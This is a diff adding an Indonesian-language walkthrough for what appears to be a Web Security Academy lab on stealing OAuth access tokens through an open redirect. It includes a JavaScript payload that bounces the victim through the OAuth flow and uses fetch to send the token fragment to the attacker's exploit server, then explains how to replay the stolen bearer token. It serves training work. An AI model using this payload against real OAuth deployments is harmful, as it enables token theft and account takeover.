@@ -1,0 +1,18 @@
+1. Lakukan proses Reconnaissance pada web lab dan temukan halaman yang berkemungkinan open redirect menggunakan path
+2. Lakukan proses login menggunakan akun yang sah dan pantau request http di burpsuite lalu cari yanng mengandung redirect_uri
+3. Edit url pada bagian redirect_uri untuk melakukan open redirect ke server exploit kita
+4. Masuk ke server exploit dan tambahkan script di bagian body dengan ketentuan seperti ini atau sejenisnya:
+
+<script>
+  if (!document.location.hash) {
+    // WAJAH 1: Lempar ke OAuth
+    window.location = 'https://oauth-[ID LAB].oauth-server.net/auth?client_id=[CLIENT ID]&redirect_uri=https://0afd0035036a88e482ac9c1d00de00f6.web-security-academy.net/oauth-callback/../[HALAMAN OPEN REDIRECT]=[DOMAIN EXPLOIT]&response_type=token&nonce=-1130653934&scope=openid%20profile%20email';
+  } else {
+    // WAJAH 2: Tangkap Token dan kirim ke log pakai fetch
+    fetch('/?BEBAS=' + encodeURIComponent(document.location.hash));
+  }
+</script>
+
+5. Kirim ke victim lalu pantau log acces dan anda akan melihat anda mendapati acces_token korban
+6. Cari bagian request http yang berhubungan dengan proses authorization type bearer lalu masukkan tokennya disana
+7. Anda akan mendapati token di suatu request http dan submit
